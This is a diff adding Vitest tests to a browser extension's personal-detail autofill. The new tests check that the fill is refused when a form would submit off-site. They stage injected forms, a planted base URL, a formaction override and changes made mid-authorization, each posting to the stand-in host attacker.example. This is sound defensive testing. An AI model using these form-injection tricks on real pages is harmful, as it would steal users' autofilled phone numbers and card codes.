@@ -6,9 +6,10 @@ type Listener = (
   sender: { id: string },
   respond: (value: unknown) => void,
 ) => boolean | undefined;
-const { sent, listeners } = vi.hoisted(() => ({
+const { sent, listeners, authorize } = vi.hoisted(() => ({
   sent: [] as Record<string, unknown>[],
   listeners: [] as Listener[],
+  authorize: vi.fn<(message: Record<string, unknown>) => Promise<unknown>>(),
 }));
 
 vi.mock("wxt/browser", () => ({
@@ -27,6 +28,7 @@ vi.mock("wxt/browser", () => ({
 vi.mock("../messaging/protocol", () => ({
   sendMessage: async (_channel: string, message: Record<string, unknown>) => {
     sent.push(message);
+    if (message["type"] === "login.detail.authorize") return authorize(message);
     return message["type"] === "login.operation.authorize"
       ? true
       : { ok: false, reason: "stale-document" };
@@ -38,6 +40,9 @@ let uninstall: (() => void) | undefined;
 beforeEach(() => {
   sent.length = 0;
   listeners.length = 0;
+  authorize
+    .mockReset()
+    .mockImplementation(async (message) => (message["destinations"] as string[]).length === 0);
   vi.useFakeTimers();
 });
 afterEach(() => {
@@ -61,9 +66,9 @@ const input = (id: string) => document.querySelector<HTMLInputElement>(`#${id}`)
 const target = (value: string) => ({ by: "id" as const, value });
 
 /** Shows the page on `/confirm` and installs the content script; returns its token. */
-async function open(): Promise<string> {
+async function open(markup = choicePage): Promise<string> {
   history.replaceState(null, "", "/confirm");
-  document.body.innerHTML = choicePage;
+  document.body.innerHTML = markup;
   uninstall = installLoginContent();
   await vi.advanceTimersByTimeAsync(200);
   const token = sent[0]?.["token"];
@@ -90,6 +95,10 @@ describe("the popup's fill of a personal detail (ADR 0061)", () => {
     command({
       version: 1,
       type: "login.detail.fill",
+      fillId: "90000000-0000-4000-8000-000000000001",
+      expiresAt: Date.now() + 60_000,
+      origin: location.origin,
+      submit: target("submit"),
       token,
       path,
       fields: [{ target: target("phone"), value: "1234", ...field }],
@@ -113,6 +122,149 @@ describe("the popup's fill of a personal detail (ADR 0061)", () => {
     expect(clicks).toBe(0);
     // Nothing about the fill goes back to the background.
     expect(JSON.stringify(sent)).not.toContain("1234");
+  });
+
+  it("refuses a dangling cross-site form before selecting a radio or exposing a value", async () => {
+    const token = await open(
+      `<form id="injected" action="https://attacker.example/collect">${choicePage}</form>`,
+    );
+    const events: string[] = [];
+    const phone = input("phone");
+    const radio = input("by-phone");
+    expect(phone.form?.id).toBe("injected");
+    expect(phone.form?.action).toBe("https://attacker.example/collect");
+    for (const event of ["beforeinput", "input", "change"])
+      phone.addEventListener(event, () => events.push(event));
+    radio.addEventListener("click", () => events.push("radio"));
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(phone.value).toBe("");
+    expect(radio.checked).toBe(false);
+    expect(events).toEqual([]);
+  });
+
+  it("refuses a relative form action redirected by an injected base URL", async () => {
+    const token = await open();
+    const base = document.createElement("base");
+    base.href = "https://attacker.example/";
+    document.head.append(base);
+    try {
+      input("phone").form!.setAttribute("action", "collect");
+      expect(await fill(token)).toEqual({ ok: false });
+      expect(input("phone").value).toBe("");
+      expect(input("by-phone").checked).toBe(false);
+    } finally {
+      base.remove();
+    }
+  });
+
+  it("refuses an unsupported form destination before dispatching any fill event", async () => {
+    const token = await open();
+    const changed = vi.fn();
+    input("phone").form!.action = "data:text/html,collect";
+    input("phone").addEventListener("input", changed);
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(input("phone").value).toBe("");
+    expect(input("by-phone").checked).toBe(false);
+    expect(changed).not.toHaveBeenCalled();
+  });
+
+  it("keeps a same-origin form fill working", async () => {
+    const token = await open();
+    input("phone").form!.action = `${location.origin}/session`;
+    expect(await fill(token)).toEqual({ ok: true });
+    expect(input("phone").value).toBe("1234");
+    expect(input("by-phone").checked).toBe(true);
+  });
+
+  it("rechecks the form destination after the radio's click changes it", async () => {
+    const token = await open();
+    const changed = vi.fn();
+    input("phone").addEventListener("input", changed);
+    input("by-phone").addEventListener("click", () => {
+      input("phone").form!.action = "https://attacker.example/collect";
+    });
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(input("phone").value).toBe("");
+    expect(changed).not.toHaveBeenCalled();
+  });
+
+  it("checks a shown submitter's override before exposing the value", async () => {
+    const token = await open();
+    input("submit").setAttribute("formaction", "https://attacker.example/collect");
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(input("phone").value).toBe("");
+    expect(input("by-phone").checked).toBe(false);
+    expect(authorize).toHaveBeenCalledWith(
+      expect.objectContaining({ destinations: ["https://attacker.example/collect"] }),
+    );
+  });
+
+  it("checks every enclosing shadow form before filling an inner safe form", async () => {
+    const token = await open();
+    document.body.innerHTML = `<form action="https://attacker.example/collect"><div id="host"></div>
+      <input id="submit" type="submit" value="Next"></form>`;
+    const shadow = document.querySelector("#host")!.attachShadow({ mode: "open" });
+    shadow.innerHTML = `<form action="/safe"><input id="phone" maxlength="4"></form>`;
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(shadow.querySelector<HTMLInputElement>("#phone")!.value).toBe("");
+  });
+
+  it("fills when the background authorizes an off-origin destination", async () => {
+    const token = await open();
+    const destination = "https://auth.login.example/session";
+    input("phone").form!.action = destination;
+    authorize.mockResolvedValue(true);
+    expect(await fill(token)).toEqual({ ok: true });
+    expect(input("phone").value).toBe("1234");
+    expect(authorize).toHaveBeenCalledWith(
+      expect.objectContaining({
+        type: "login.detail.authorize",
+        token,
+        fillId: "90000000-0000-4000-8000-000000000001",
+        destinations: [destination],
+      }),
+    );
+  });
+
+  it.each([false, { ok: true }, undefined])(
+    "fills nothing when destination authorization is refused or malformed (%j)",
+    async (answer) => {
+      const token = await open();
+      authorize.mockResolvedValue(answer);
+      expect(await fill(token)).toEqual({ ok: false });
+      expect(input("phone").value).toBe("");
+      expect(input("by-phone").checked).toBe(false);
+    },
+  );
+
+  it("fills nothing when destination authorization is unavailable", async () => {
+    const token = await open();
+    authorize.mockRejectedValue(new Error("background unavailable"));
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(input("phone").value).toBe("");
+    expect(input("by-phone").checked).toBe(false);
+  });
+
+  it("fills nothing when the destination changes during the authorization wait", async () => {
+    const token = await open();
+    authorize.mockImplementationOnce(async () => {
+      input("phone").form!.action = "https://attacker.example/collect";
+      return true;
+    });
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(input("phone").value).toBe("");
+    expect(input("by-phone").checked).toBe(false);
+  });
+
+  it("fills nothing when the submitter changes during the authorization wait", async () => {
+    const token = await open();
+    authorize.mockImplementationOnce(async () => {
+      input("submit").replaceWith(input("submit").cloneNode(true));
+      return true;
+    });
+    expect(await fill(token)).toEqual({ ok: false });
+    expect(input("phone").value).toBe("");
+    expect(input("by-phone").checked).toBe(false);
   });
 
   it("fills a card code only into a password input or a text input of 3 or 4", async () => {
@@ -191,6 +343,10 @@ describe("the popup's fill of a personal detail (ADR 0061)", () => {
           {
             version: 1,
             type: "login.detail.fill",
+            fillId: "90000000-0000-4000-8000-000000000001",
+            expiresAt: Date.now() + 60_000,
+            origin: location.origin,
+            submit: target("submit"),
             token: "another-token",
             path: "/confirm",
             fields: [{ target: target("phone"), value: "1234" }],
